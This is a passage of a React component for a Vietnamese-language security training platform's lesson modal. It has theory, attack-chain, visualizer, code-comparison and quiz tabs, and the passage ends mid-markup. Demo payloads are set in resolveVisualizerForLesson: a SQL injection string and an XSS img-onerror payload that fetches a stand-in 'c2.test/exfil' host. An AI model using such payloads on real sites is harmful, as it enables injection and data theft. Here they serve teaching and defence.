import { useState, useEffect } from "react"
import { createPortal } from "react-dom"
import { useSearchParams } from "react-router-dom"
import {
  X,
  CheckCircle2,
  Clock,
  Terminal,
  Shield,
  Copy,
  Check,
  ChevronLeft,
  ChevronRight,
  AlertTriangle,
  BookOpen,
  Code2,
  ShieldAlert,
  ShieldCheck,
  Award,
  FileText,
  Compass,
  Lightbulb,
  Search,
  Target,
  FlaskConical,
  Lock,
  Layers,
} from "lucide-react"
import {
  AstParserVisualizer,
  MemoryLayoutSimulator,
  TlsHandshakeVisualizer,
  AcademicCitationBlock,
} from "../../../components/academic"
import useLearningStore from "../../../stores/useLearningStore"
import useNotificationStore from "../../../stores/useNotificationStore"

// Curated Patched Secure Code Implementations fallback
const SECURE_CODE_MAPPING = {
  s1: `// Hardened CORS Implementation (Strict Whitelist + Origin Vary Header):
const ALLOWED_ORIGINS = new Set([
  'https://bank.com',
  'https://app.bank.com'
]);

app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (ALLOWED_ORIGINS.has(origin)) {
    res.header('Access-Control-Allow-Origin', origin);
    res.header('Access-Control-Allow-Credentials', 'true');
    res.header('Vary', 'Origin');
  }
  next();
});`,
  s2: `-- Hardened SQL Defense: Parameterized Prepared Statements
-- User input bound strictly as parameters, never parsed into SQL AST:
PREPARE stmt FROM 
  'SELECT id, email, role FROM system_users 
   WHERE department = ? AND created_by = ? AND status = ?';
EXECUTE stmt USING @dept, @username, @status;
DEALLOCATE PREPARE stmt;`,
  s3: `// Hardened Client-Side Rendering with DOMPurify & TextContent:
import DOMPurify from 'dompurify';

const params = new URLSearchParams(window.location.search);
const redirectTarget = params.get('next');

// SAFE SINK: Using textContent eliminates HTML parser execution entirely
const statusEl = document.getElementById('status-container');
statusEl.textContent = redirectTarget || 'Dashboard Ready';
// If HTML formatting is mandatory, sanitize strictly with DOMPurify:
// statusEl.innerHTML = DOMPurify.sanitize(redirectTarget);`,
}

const ATTACK_CHAIN_STAGES = [
  {
    step: "01",
    phase: "RECON & MAPPING",
    title: "Thu thập & Nhận diện bề mặt tấn công",
    desc: "Phân tích phản hồi giao thức, tiêu đề HTTP/TCP, phiên bản dịch vụ và xác định ranh giới tin cậy (Trust Boundary).",
    telemetry: "HTTP/1.1 200 OK | Server: nginx/1.22 | Access-Control-Allow-Origin: *",
  },
  {
    step: "02",
    phase: "FILTER EVASION",
    title: "Kiểm chứng bộ lọc & Biến đổi ngữ nghĩa",
    desc: "Đánh giá các quy tắc lọc đầu vào (WAF/Regex) và kiểm tra điểm yếu khi phân tách cú pháp giữa dữ liệu và mã lệnh.",
    telemetry: "WAF Inspection: Bypassed via Lexical Delimiter Escape / Token Split",
  },
  {
    step: "03",
    phase: "EXECUTION SINK",
    title: "Kích hoạt tại điểm thực thi (Sink)",
    desc: "Payload chạm tới điểm xử lý nhạy cảm (Database AST, DOM innerHTML, Stack Buffer, hoặc Metadata Service).",
    telemetry: "Execution Sink: [ALERT] Unvalidated user token altered control flow",
  },
  {
    step: "04",
    phase: "REMEDIATION & MITIGATION",
    title: "Vá lỗi kiến trúc & Giám sát SOC",
    desc: "Áp dụng PreparedStatement, cô lập ngữ cảnh, kiểm tra biên bộ nhớ (Stack Canary/NX) và viết luật phát hiện SIEM.",
    telemetry: "Patch Status: Parameterized / Bounds-Checked Defense Enforced",
  },
]

const VALID_TABS = new Set(["theory", "diagram", "code", "quiz"])

/**
 * Matches the current course & lesson topic intelligently to the most relevant
 * Academic Research Visualizer ("ast" | "memory" | "tls") with contextual initial props.
 */
function resolveVisualizerForLesson(course, lesson) {
  const hay = `${course?.id || ""} ${course?.category || ""} ${lesson?.id || ""} ${lesson?.title || ""} ${lesson?.cve || ""} ${lesson?.rfc || ""}`.toLowerCase()

  if (
    course?.category === "reverse" ||
    /stack|buffer|overflow|shellcode|rop|aslr|ghidra|x86_64|cwe-121|cwe-787|nhị phân|ngăn xếp|bộ nhớ/.test(hay)
  ) {
    let initialInputSize = 24
    if (/rop|rip|aslr|tràn bộ đệm|cwe-121/.test(hay)) {
      initialInputSize = 40
    } else if (/kiến trúc|abi|thanh ghi|ghidra/.test(hay)) {
      initialInputSize = 16
    }
    return { type: "memory", initialPayload: "' OR 1=1 --", initialInputSize, initialStep: 0 }
  }

  if (
    course?.category === "network" ||
    course?.id === "mod-sec101" ||
    course?.id === "mod-crypto101" ||
    /tls|ssl|pki|handshake|bắt tay|mật mã|aes|rsa|ecc|hmac|arp|dns|pcap|wireshark|mitm|x\.509/.test(hay)
  ) {
    let initialStep = 0
    if (/hkdf|khóa|diffie|ecdh|rsa|ecc/.test(hay)) {
      initialStep = 2
    } else if (/aes|gcm|aead|hmac|truyền tải/.test(hay)) {
      initialStep = 3
    } else if (/x\.509|pki|ca|serverhello/.test(hay)) {
      initialStep = 1
    }
    return { type: "tls", initialPayload: "' OR 1=1 --", initialInputSize: 16, initialStep }
  }

  if (/xss|dom|innerhtml|cwe-79/.test(hay)) {
    return {
      type: "ast",
      initialPayload: "<img src=x onerror=\"fetch('https://c2.test/exfil')\">",
      initialInputSize: 16,
      initialStep: 0,
    }
  }

  return {
    type: "ast",
    initialPayload: "' OR 1=1 --",
    initialInputSize: 16,
    initialStep: 0,
  }
}

function LessonModalContent({
  course,
  lesson,
  lessonIndex,
  activeTab,
  setActiveTab,
  closeLessonModal,
  nextLesson,
  prevLesson,
  toggleLesson,
  completedLessons,
  launchLessonLab,
  submitQuizAttempt,
}) {
  const defaultSim = resolveVisualizerForLesson(course, lesson)
  const [selectedChainStep, setSelectedChainStep] = useState(0)
  const [simType, setSimType] = useState(defaultSim.type)
  const [copiedPayload, setCopiedPayload] = useState(false)
  const [selectedOption, setSelectedOption] = useState(null)
  const [quizSubmitted, setQuizSubmitted] = useState(false)
  const [revealedHintTier, setRevealedHintTier] = useState(0)

  const totalLessons = course.syllabus.length
  const isDone = (completedLessons[course.id] || []).includes(lesson.id)

  const securePatchCode =
    lesson.secureSnippet ||
    SECURE_CODE_MAPPING[lesson.id] ||
    `// Hardened Security Standard Implementation:
// 1. Strict Server-Side Type Validation & Schema Enforcement
// 2. Least-Privilege Execution Environment
// 3. Cryptographic Token Binding & Audit Telemetry Logging
const secureResult = await enforceSecurityGuardrail(userInput, {
  sanitize: true,
  requireAuth: true,
  logContext: { lesson: "${lesson.id}", mitre: "${lesson.mitre || ""}" }
});`

  const handleCopyPayload = () => {
    if (!lesson.payloadExample) return
    navigator.clipboard.writeText(lesson.payloadExample)
    setCopiedPayload(true)
    useNotificationStore
      .getState()
      .info("Đã Sao Chép Payload", "Đã sao chép payload kiểm thử vào clipboard.")
    setTimeout(() => setCopiedPayload(false), 2000)
  }

  const handleQuizSubmit = (optIndex) => {
    setSelectedOption(optIndex)
    setQuizSubmitted(true)
    if (submitQuizAttempt) {
      submitQuizAttempt(lesson, optIndex, lesson.quiz?.correct)
    }
    if (optIndex === lesson.quiz?.correct) {
      useNotificationStore
        .getState()
        .success(
          "Chính xác! Phân Tích Đạt Chuẩn",
          "+50 XP Thưởng Kiểm Tra Kiến Thức (Đã ghi nhận kết quả)"
        )
    }
  }

  const handleResetQuiz = () => {
    setSelectedOption(null)
    setQuizSubmitted(false)
    setRevealedHintTier(0)
  }

  return (
    <div
      onClick={(e) => e.stopPropagation()}
      className="relative w-full max-w-5xl max-h-[92vh] bg-[#FAF9F6] dark:bg-[#0B0E14] border border-[#E5E2DC] dark:border-white/[0.1] rounded-2xl shadow-2xl flex flex-col overflow-hidden text-[#0F172A] dark:text-[#F1F5F9]"
    >
      {/* ====================================================================
          1. ACADEMIC WORKSPACE MODAL HEADER
         ==================================================================== */}
      <div className="px-5 py-3.5 border-b border-[#E5E2DC] dark:border-white/[0.08] bg-[#F3F1EC] dark:bg-[#161C2A] flex items-center justify-between gap-4">
        <div className="flex items-center gap-2.5 flex-wrap min-w-0">
          <span className="px-2.5 py-1 rounded-md text-xs font-mono-tech font-semibold bg-blue-50 dark:bg-blue-500/12 text-[#1D4ED8] dark:text-[#93C5FD] border border-blue-200 dark:border-blue-500/25 shrink-0">
            {course.code} · BÀI {String(lessonIndex + 1).padStart(2, "0")}/{String(totalLessons).padStart(2, "0")}
          </span>

          <span className="text-[11px] font-mono-tech px-2 py-0.5 rounded bg-white dark:bg-[#121722] text-[#475569] dark:text-[#94A3B8] border border-[#E5E2DC] dark:border-white/[0.08] hidden sm:inline-block truncate max-w-[260px]">
            {course.track}
          </span>

          {course.cvssBase && (
            <span className="text-[11px] font-mono-tech px-2 py-0.5 rounded bg-rose-50 dark:bg-rose-500/12 text-rose-700 dark:text-rose-300 border border-rose-200 dark:border-rose-500/25 shrink-0">
              CVSS {course.cvssBase}
            </span>
          )}

          {isDone && (
            <span className="text-[11px] font-mono-tech px-2 py-0.5 rounded bg-emerald-50 dark:bg-emerald-500/12 text-emerald-700 dark:text-emerald-300 border border-emerald-200 dark:border-emerald-500/25 inline-flex items-center gap-1 shrink-0">
              <CheckCircle2 className="w-3.5 h-3.5" />
              <span>ĐÃ HOÀN THÀNH</span>
            </span>
          )}
        </div>

        <div className="flex items-center gap-2 shrink-0">
          <button
            type="button"
            onClick={() => toggleLesson(course.id, lesson.id)}
            className={`px-3 py-1.5 rounded-lg font-mono-tech text-xs font-semibold transition-colors inline-flex items-center gap-1.5 cursor-pointer border whitespace-nowrap ${
              isDone
                ? "bg-emerald-50 dark:bg-emerald-500/12 border-emerald-200 dark:border-emerald-500/30 text-emerald-700 dark:text-emerald-300 hover:bg-emerald-100/80 dark:hover:bg-emerald-500/20"
                : "bg-white dark:bg-[#121722] border-[#E5E2DC] dark:border-white/[0.1] text-[#0F172A] dark:text-[#F1F5F9] hover:bg-[#ECE9E2] dark:hover:bg-[#1B2335]"
            }`}
          >
            <CheckCircle2 className="w-3.5 h-3.5" />
            <span>{isDone ? "Đã Hoàn Thành" : "Đánh Dấu Xong"}</span>
          </button>

          <button
            type="button"
            onClick={closeLessonModal}
            aria-label="Đóng cửa sổ bài học"
            className="p-1.5 rounded-lg bg-white dark:bg-[#121722] hover:bg-[#ECE9E2] dark:hover:bg-[#1B2335] text-[#64748B] dark:text-[#94A3B8] hover:text-[#0F172A] dark:hover:text-[#F1F5F9] border border-[#E5E2DC] dark:border-white/[0.08] transition-colors cursor-pointer"
            title="Đóng bài học"
          >
            <X className="w-4 h-4" />
          </button>
        </div>
      </div>

      {/* ====================================================================
          2. LESSON TITLE & SCHOLARLY METADATA STRIP
         ==================================================================== */}
      <div className="px-6 py-4 bg-white dark:bg-[#121722] border-b border-[#E5E2DC] dark:border-white/[0.08] space-y-2.5">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
          <h2
            id="lesson-modal-title"
            className="font-serif-editorial text-xl sm:text-2xl font-medium text-[#0F172A] dark:text-[#F1F5F9] tracking-tight leading-snug"
          >
            {lesson.title}
          </h2>

          <div className="flex items-center gap-1.5 text-xs font-mono-tech text-[#475569] dark:text-[#94A3B8] shrink-0">
            <Clock className="w-3.5 h-3.5 text-[#1D4ED8] dark:text-[#38BDF8]" />
            <span>Thời lượng: {lesson.duration}</span>
          </div>
        </div>

        <div className="flex flex-wrap gap-2 text-[11px] font-mono-tech">
          <span className="px-2.5 py-0.5 rounded bg-[#F3F1EC] dark:bg-[#161C2A] text-[#0F172A] dark:text-[#F1F5F9] border border-[#E5E2DC] dark:border-white/[0.08]">
            Mục tiêu: {lesson.objective}
          </span>
          {lesson.mitre && (
            <span className="px-2.5 py-0.5 rounded bg-amber-50 dark:bg-amber-500/12 text-amber-800 dark:text-amber-300 border border-amber-200 dark:border-amber-500/25">
              MITRE: {lesson.mitre}
            </span>
          )}
          {lesson.cve && (
            <span className="px-2.5 py-0.5 rounded bg-blue-50 dark:bg-blue-500/12 text-[#1D4ED8] dark:text-[#93C5FD] border border-blue-200 dark:border-blue-500/25">
              {lesson.cve}
            </span>
          )}
        </div>
      </div>

      {/* ====================================================================
          3. TAB NAVIGATION BAR (4 TABS)
         ==================================================================== */}
      <div
        role="tablist"
        aria-label="Nội dung bài học"
        className="flex items-center px-6 border-b border-[#E5E2DC] dark:border-white/[0.08] bg-[#FAF9F6] dark:bg-[#0B0E14] gap-2 overflow-x-auto"
      >
        {[
          { id: "theory", label: "Lý thuyết & Ngữ cảnh", icon: BookOpen },
          { id: "diagram", label: "Mô phỏng Cơ chế", icon: FlaskConical },
          { id: "code", label: "Mã nguồn & Bản vá", icon: Code2 },
          { id: "quiz", label: "Kiểm tra Quiz (+50 XP)", icon: FileText },
        ].map((tab) => {
          const Icon = tab.icon
          const isActive = activeTab === tab.id
          return (
            <button
              key={tab.id}
              type="button"
              role="tab"
              aria-selected={isActive}
              onClick={() => setActiveTab(tab.id)}
              className={`py-3 px-3.5 text-xs font-semibold transition-colors border-b-2 inline-flex items-center gap-2 cursor-pointer whitespace-nowrap shrink-0 ${
                isActive
                  ? "border-[#1D4ED8] dark:border-[#3B82F6] text-[#1D4ED8] dark:text-[#38BDF8] bg-white dark:bg-[#121722]"
                  : "border-transparent text-[#64748B] dark:text-[#94A3B8] hover:text-[#0F172A] dark:hover:text-[#F1F5F9]"
              }`}
            >
              <Icon className="w-3.5 h-3.5 shrink-0" />
              <span>{tab.label}</span>
            </button>
          )
        })}
      </div>

      {/* ====================================================================
          4. DYNAMIC TAB CONTENT VIEWPORT
         ==================================================================== */}
      <div className="flex-1 overflow-y-auto p-5 sm:p-7 space-y-6">
        {/* TAB 1: THEORY, ACADEMIC CITATION BLOCK & ATTACK CHAIN */}
        {activeTab === "theory" && (
          <div className="space-y-6">
            {/* Academic Citation Block */}
            <AcademicCitationBlock
              mitre={lesson.mitre || course.mitre || ""}
              cve={lesson.cve || ""}
              rfc={lesson.rfc || course.rfc || ""}
              bloomLevel={lesson.bloomLevel || course.bloomLevel || "Phân tích & Đánh giá"}
              references={lesson.references || course.references || []}
            />

            {/* Formal Theory Monograph */}
            <div className="p-5 rounded-xl bg-white dark:bg-[#121722] border border-[#E5E2DC] dark:border-white/[0.08] space-y-2.5">
              <div className="flex items-center gap-2 text-[#1D4ED8] dark:text-[#38BDF8] font-mono-tech font-semibold text-xs uppercase tracking-wider">
                <Shield className="w-4 h-4" />
                <span>§01 Chuyên Khảo Lý Thuyết Hình Thức</span>
              </div>
              <p className="text-sm sm:text-[15px] text-[#0F172A] dark:text-[#E2E8F0] leading-[1.7] font-sans">
                {lesson.theory}
              </p>
            </div>

            {/* Interactive 4-Stage Attack Chain Visualizer */}
            <div className="space-y-3">
              <div className="flex items-center justify-between gap-2 flex-wrap">
                <h3 className="text-xs font-mono-tech font-semibold text-[#475569] dark:text-[#94A3B8] uppercase tracking-wider flex items-center gap-2">
                  <Compass className="w-4 h-4 text-[#1D4ED8] dark:text-[#38BDF8]" />
                  <span>§02 Chuỗi Kích Hoạt &amp; Phòng Thủ Đa Tầng</span>
                </h3>
                <button
                  type="button"
                  onClick={() => setActiveTab("diagram")}
                  className="text-xs font-mono-tech font-semibold text-[#1D4ED8] dark:text-[#38BDF8] hover:underline cursor-pointer inline-flex items-center gap-1"
                >
                  <FlaskConical className="w-3.5 h-3.5" />
                  <span>Mở Mô phỏng Cơ chế Tương tác →</span>
                </button>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
                {ATTACK_CHAIN_STAGES.map((st, idx) => {
                  const isSelected = selectedChainStep === idx
                  return (
                    <button
                      key={st.step}
                      type="button"
                      onClick={() => setSelectedChainStep(idx)}
                      className={`text-left p-3.5 rounded-xl border transition-colors cursor-pointer space-y-1.5 ${
                        isSelected
                          ? "bg-white dark:bg-[#121722] border-[#1D4ED8] dark:border-[#3B82F6] ring-1 ring-[#1D4ED8]/25 dark:ring-[#3B82F6]/30"
                          : "bg-[#F3F1EC] dark:bg-[#161C2A]/60 hover:bg-white dark:hover:bg-[#121722] border-[#E5E2DC] dark:border-white/[0.08]"
                      }`}
                    >
                      <div className="flex items-center justify-between gap-1.5">
                        <span
                          className={`text-[10px] font-mono-tech font-bold px-1.5 py-0.5 rounded ${
                            isSelected
                              ? "bg-[#1D4ED8] dark:bg-[#3B82F6] text-white"
                              : "bg-white dark:bg-[#121722] text-[#475569] dark:text-[#94A3B8] border border-[#E5E2DC] dark:border-white/[0.08]"
                          }`}
                        >
                          GIAI ĐOẠN {st.step}
                        </span>
                        <span className="text-[10px] font-mono-tech font-semibold text-[#1D4ED8] dark:text-[#38BDF8] truncate">
                          {st.phase}
                        </span>
                      </div>
                      <h4 className="text-xs font-semibold text-[#0F172A] dark:text-[#F1F5F9] leading-snug line-clamp-2">
                        {st.title}
                      </h4>
                    </button>
                  )
                })}
              </div>

              {/* Selected Stage Detail Inspector */}
              <div className="p-4 rounded-xl bg-white dark:bg-[#121722] border border-[#E5E2DC] dark:border-white/[0.08] space-y-2.5">
                <div className="flex items-center justify-between text-xs font-mono-tech flex-wrap gap-2">
                  <span className="font-semibold text-[#1D4ED8] dark:text-[#38BDF8] flex items-center gap-2">
                    <Terminal className="w-3.5 h-3.5" />
                    <span>
                      GIAI ĐOẠN {ATTACK_CHAIN_STAGES[selectedChainStep].step}:{" "}
                      {ATTACK_CHAIN_STAGES[selectedChainStep].title}
                    </span>
                  </span>
                  <span className="text-[10px] text-[#64748B] dark:text-[#94A3B8]">
                    TELEMETRY SNAPSHOT
                  </span>
                </div>
                <p className="text-xs text-[#475569] dark:text-[#94A3B8] leading-relaxed font-sans">
                  {ATTACK_CHAIN_STAGES[selectedChainStep].desc}
                </p>
                <div className="p-3 rounded-lg bg-[#0F172A] dark:bg-[#080B10] border border-[#1E293B] dark:border-white/[0.08] font-mono-tech text-[11px] text-emerald-300 overflow-x-auto">
                  <code>{ATTACK_CHAIN_STAGES[selectedChainStep].telemetry}</code>
                </div>
              </div>
            </div>

            {/* Direct Cyber Range Sandbox Trigger Card */}
            <div className="p-4 rounded-xl bg-[#F3F1EC] dark:bg-[#161C2A] border border-[#E5E2DC] dark:border-white/[0.08] flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
              <div className="space-y-1">
                <div className="flex items-center gap-2 text-[#0F172A] dark:text-[#F1F5F9] font-mono-tech text-xs font-semibold">
                  <Terminal className="w-4 h-4 text-[#1D4ED8] dark:text-[#38BDF8]" />
                  <span>MÁY ẢO THỰC HÀNH CÔ LẬP (SANDBOX TERMINAL)</span>
                </div>
                <p className="text-xs text-[#475569] dark:text-[#94A3B8]">
                  Khởi động phiên Linux Terminal cô lập để trực tiếp kiểm chứng cơ chế và trích xuất bằng chứng trong bài học.
                </p>
              </div>

              <button
                type="button"
                onClick={() => launchLessonLab(course.labId)}
                className="px-4 py-2 rounded-lg bg-[#1D4ED8] hover:bg-[#1E40AF] dark:bg-[#3B82F6] dark:hover:bg-[#2563EB] text-white font-semibold text-xs inline-flex items-center gap-2 shrink-0 transition-colors cursor-pointer whitespace-nowrap"
              >
                <Terminal className="w-3.5 h-3.5" />
                <span>Mở Sandbox CLI</span>
              </button>
            </div>
          </div>
        )}

        {/* TAB 2: INTERACTIVE LAB DIAGRAM / MECHANISM VISUALIZER */}
        {activeTab === "diagram" && (
          <div className="space-y-5">
            <div className="p-4 rounded-xl bg-white dark:bg-[#121722] border border-[#E5E2DC] dark:border-white/[0.08] flex flex-col md:flex-row md:items-center justify-between gap-3">
              <div className="space-y-1">
                <div className="flex items-center gap-2 font-mono-tech text-xs font-semibold text-[#1D4ED8] dark:text-[#38BDF8]">
                  <FlaskConical className="w-4 h-4" />
                  <span>PHÒNG THÍ NGHIỆM TRỰC QUAN CƠ CHẾ HỆ THỐNG</span>
                </div>
                <p className="text-xs text-[#475569] dark:text-[#94A3B8] font-sans">
                  Hệ thống tự động chọn mô hình phù hợp nhất với bài{" "}
                  <strong className="text-[#0F172A] dark:text-[#F1F5F9]">{lesson.title}</strong>. Bạn có thể chuyển đổi qua lại giữa 3 phòng mô phỏng bên cạnh.
                </p>
              </div>

              <div
                role="group"
                aria-label="Chọn mô hình mô phỏng cơ chế"
                className="flex items-center gap-1.5 flex-wrap shrink-0"
              >
                {[
                  { id: "ast", label: "Phân tích AST", icon: Code2 },
                  { id: "memory", label: "Bộ nhớ Stack", icon: Layers },
                  { id: "tls", label: "Bắt tay TLS 1.3", icon: Lock },
                ].map((item) => {
                  const Icon = item.icon
                  const isActive = simType === item.id
                  const isRecommended = defaultSim.type === item.id
                  return (
                    <button
                      key={item.id}
                      type="button"
                      onClick={() => setSimType(item.id)}
                      className={`px-3 py-1.5 rounded-lg text-xs font-mono-tech font-medium inline-flex items-center gap-1.5 transition-colors cursor-pointer whitespace-nowrap border ${
                        isActive
                          ? "bg-[#1D4ED8] dark:bg-[#3B82F6] text-white border-[#1D4ED8] dark:border-[#3B82F6]"
                          : "bg-[#F3F1EC] dark:bg-[#161C2A] text-[#475569] dark:text-[#94A3B8] border-[#E5E2DC] dark:border-white/[0.08] hover:text-[#0F172A] dark:hover:text-[#F1F5F9]"
                      }`}
                    >
                      <Icon className="w-3.5 h-3.5 shrink-0" />
                      <span>{item.label}</span>
                      {isRecommended && (
                        <span
                          className={`text-[9px] px-1 py-0.2 rounded ${
                            isActive
                              ? "bg-white/20 text-white"
                              : "bg-blue-50 dark:bg-blue-500/15 text-[#1D4ED8] dark:text-[#93C5FD]"
                          }`}
                        >
                          Khớp bài
                        </span>
                      )}
                    </button>
                  )
                })}
              </div>
            </div>

            {simType === "ast" && (
              <AstParserVisualizer initialPayload={defaultSim.initialPayload} />
            )}

            {simType === "memory" && (
              <MemoryLayoutSimulator initialInputSize={defaultSim.initialInputSize} />
            )}

            {simType === "tls" && (
              <TlsHandshakeVisualizer initialStep={defaultSim.initialStep} />
            )}
          </div>
        )}

        {/* TAB 3: SIDE-BY-SIDE VULNERABLE VS HARDENED CODE DIFF */}
        {activeTab === "code" && (
          <div className="space-y-6">
            <div className="flex items-center justify-between flex-wrap gap-2">
              <div className="flex items-center gap-2">
                <Code2 className="w-4 h-4 text-[#1D4ED8] dark:text-[#38BDF8]" />
                <h3 className="text-xs font-mono-tech font-semibold text-[#475569] dark:text-[#94A3B8] uppercase tracking-wider">
                  Đối Chiếu Mã Nguồn: Đoạn Code Lỗi vs Bản Vá Phòng Thủ
                </h3>
              </div>
              <span className="text-[11px] font-mono-tech text-[#1D4ED8] dark:text-[#38BDF8]">
                Chuẩn hóa OWASP ASVS &amp; NIST
              </span>
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
              {/* Left Pane: Vulnerable Code */}
              <div className="rounded-xl border border-rose-200 dark:border-rose-500/30 bg-white dark:bg-[#121722] overflow-hidden flex flex-col">
                <div className="px-3.5 py-2.5 bg-rose-50 dark:bg-rose-950/35 border-b border-rose-200 dark:border-rose-500/25 flex items-center justify-between text-xs font-mono-tech gap-2">
                  <span className="font-semibold text-rose-700 dark:text-rose-300 flex items-center gap-1.5">
                    <ShieldAlert className="w-3.5 h-3.5" />
                    <span>VULNERABLE (MÃ NGUỒN LỖI)</span>
                  </span>
                  <span className="text-[10px] px-1.5 py-0.5 rounded bg-rose-100 dark:bg-rose-900/50 text-rose-800 dark:text-rose-200 whitespace-nowrap">
                    KHÔNG AN TOÀN
                  </span>
                </div>

                <div className="p-4 bg-[#0F172A] dark:bg-[#080B10] font-mono-tech text-xs text-rose-200 overflow-x-auto flex-1 leading-relaxed whitespace-pre">
                  <code>{lesson.codeSnippet}</code>
                </div>

                <div className="p-3 bg-rose-50/60 dark:bg-rose-950/20 border-t border-rose-200 dark:border-rose-500/20 text-[11px] font-sans text-rose-800 dark:text-rose-200">
                  <strong>Điểm yếu:</strong> Dữ liệu không tin cậy vượt qua ranh giới kiểm soát và tác động trực tiếp đến luồng thực thi.
                </div>
              </div>

              {/* Right Pane: Hardened Secure Patch */}
              <div className="rounded-xl border border-emerald-200 dark:border-emerald-500/30 bg-white dark:bg-[#121722] overflow-hidden flex flex-col">
                <div className="px-3.5 py-2.5 bg-emerald-50 dark:bg-emerald-950/35 border-b border-emerald-200 dark:border-emerald-500/25 flex items-center justify-between text-xs font-mono-tech gap-2">
                  <span className="font-semibold text-emerald-700 dark:text-emerald-300 flex items-center gap-1.5">
                    <ShieldCheck className="w-3.5 h-3.5" />
                    <span>HARDENED DEFENSE (BẢN VÁ AN TOÀN)</span>
                  </span>
                  <span className="text-[10px] px-1.5 py-0.5 rounded bg-emerald-100 dark:bg-emerald-900/50 text-emerald-800 dark:text-emerald-200 whitespace-nowrap">
                    CHUẨN PHÒNG THỦ
                  </span>
                </div>

                <div className="p-4 bg-[#0F172A] dark:bg-[#080B10] font-mono-tech text-xs text-emerald-200 overflow-x-auto flex-1 leading-relaxed whitespace-pre">
                  <code>{securePatchCode}</code>
                </div>

                <div className="p-3 bg-emerald-50/60 dark:bg-emerald-950/20 border-t border-emerald-200 dark:border-emerald-500/20 text-[11px] font-sans text-emerald-800 dark:text-emerald-200">
                  <strong>Khắc phục:</strong> Tách biệt dữ liệu và cấu trúc lệnh, áp dụng whitelist/tham số hóa và ghi nhật ký giám sát.
                </div>
              </div>
            </div>

            {lesson.payloadExample && (
              <div className="p-4 rounded-xl bg-white dark:bg-[#121722] border border-[#E5E2DC] dark:border-white/[0.08] space-y-2.5">
                <div className="flex items-center justify-between gap-2 flex-wrap">
                  <span className="text-xs font-mono-tech font-semibold text-[#0F172A] dark:text-[#F1F5F9] uppercase tracking-wider flex items-center gap-1.5">
                    <Terminal className="w-3.5 h-3.5 text-[#1D4ED8] dark:text-[#38BDF8]" />
                    <span>Mẫu Kiểm Thử Khai Thác (Test Vector)</span>
                  </span>

                  <button
                    type="button"
                    onClick={handleCopyPayload}
                    className="px-2.5 py-1 rounded-lg bg-[#F3F1EC] hover:bg-[#ECE9E2] dark:bg-[#161C2A] dark:hover:bg-[#1B2335] text-[#0F172A] dark:text-[#F1F5F9] font-mono-tech text-xs inline-flex items-center gap-1.5 transition-colors cursor-pointer border border-[#E5E2DC] dark:border-white/[0.08]"
                  >
                    {copiedPayload ? (
                      <>
                        <Check className="w-3.5 h-3.5 text-emerald-600 dark:text-emerald-400" />
                        <span className="text-emerald-700 dark:text-emerald-400">Đã sao chép</span>
                      </>
                    ) : (
                      <>
                        <Copy className="w-3.5 h-3.5" />
                        <span>Sao chép Payload</span>
                      </>
                    )}
                  </button>
                </div>

                <div className="p-3 rounded-lg bg-[#0F172A] dark:bg-[#080B10] border border-[#1E293B] dark:border-white/[0.08] font-mono-tech text-xs text-amber-300 break-all select-all">
                  <code>{lesson.payloadExample}</code>
                </div>
              </div>
            )}
          </div>
        )}

        {/* TAB 4: TACTICAL QUIZ & KNOWLEDGE CHECK */}
        {activeTab === "quiz" && (
          <div className="space-y-5">
            {lesson.quiz ? (
              <div className="p-5 rounded-xl bg-white dark:bg-[#121722] border border-[#E5E2DC] dark:border-white/[0.08] space-y-4">
                <div className="flex items-center justify-between gap-2">
                  <span className="text-xs font-mono-tech font-semibold text-[#1D4ED8] dark:text-[#38BDF8] uppercase tracking-wider flex items-center gap-1.5">
                    <FileText className="w-4 h-4" />
                    <span>Thẩm Định Kiến Thức Chuyên Môn</span>
                  </span>

                  <span className="text-xs font-mono-tech text-amber-700 dark:text-amber-300 font-semibold flex items-center gap-1">
                    <Award className="w-3.5 h-3.5" />
                    <span>+50 XP</span>
                  </span>
                </div>

                <h3 className="font-serif-editorial text-lg font-medium text-[#0F172A] dark:text-[#F1F5F9] leading-relaxed">
                  {lesson.quiz.question}
                </h3>

                {/* Options */}
                <div className="space-y-2.5 pt-1">
                  {lesson.quiz.options.map((opt, idx) => {
                    const isSelected = selectedOption === idx
                    const isCorrect = idx === lesson.quiz.correct

                    let style =
                      "bg-[#FAF9F6] hover:bg-[#F3F1EC] dark:bg-[#0B0E14] dark:hover:bg-[#161C2A] border-[#E5E2DC] dark:border-white/[0.08] text-[#0F172A] dark:text-[#F1F5F9]"
                    if (quizSubmitted) {
                      if (isCorrect) {
                        style =
                          "bg-emerald-50 dark:bg-emerald-950/35 border-emerald-500 text-emerald-900 dark:text-emerald-200 font-semibold"
                      } else if (isSelected) {
                        style =
                          "bg-rose-50 dark:bg-rose-950/35 border-rose-500 text-rose-900 dark:text-rose-200"
                      } else {
                        style =
                          "bg-[#F3F1EC] dark:bg-[#161C2A]/50 border-[#E5E2DC] dark:border-white/[0.06] text-[#64748B] dark:text-[#94A3B8] opacity-60"
                      }
                    }

                    return (
                      <button
                        key={idx}
                        type="button"
                        disabled={quizSubmitted}
                        onClick={() => handleQuizSubmit(idx)}
                        className={`w-full text-left p-3.5 rounded-xl border text-xs sm:text-sm transition-colors flex items-start gap-3 cursor-pointer ${style}`}
                      >
                        <span className="font-mono-tech text-xs font-bold px-2 py-0.5 rounded bg-white dark:bg-[#121722] border border-[#E5E2DC] dark:border-white/[0.1] text-[#475569] dark:text-[#94A3B8] shrink-0">
                          {String.fromCharCode(65 + idx)}
                        </span>
                        <span className="flex-1 leading-relaxed">{opt}</span>
                      </button>
                    )
                  })}
                </div>

                {/* Progressive Hint Tiers */}
                <div className="pt-3 border-t border-[#EFEDE7] dark:border-white/[0.06] space-y-2.5">
                  <div className="flex items-center justify-between text-xs font-mono-tech flex-wrap gap-2">
                    <span className="text-[#475569] dark:text-[#94A3B8] flex items-center gap-1.5">
                      <Lightbulb className="w-3.5 h-3.5 text-amber-600 dark:text-amber-400" />
                      <span>Gợi ý phân tích theo từng mức:</span>
                    </span>
                    <div className="flex gap-1.5 flex-wrap">
                      {[1, 2, 3].map((tier) => (
                        <button
                          key={tier}
                          type="button"
                          onClick={() =>
                            setRevealedHintTier(revealedHintTier === tier ? tier - 1 : tier)
                          }
                          className={`px-2.5 py-1 rounded-md text-[11px] font-mono-tech transition-colors cursor-pointer border whitespace-nowrap ${
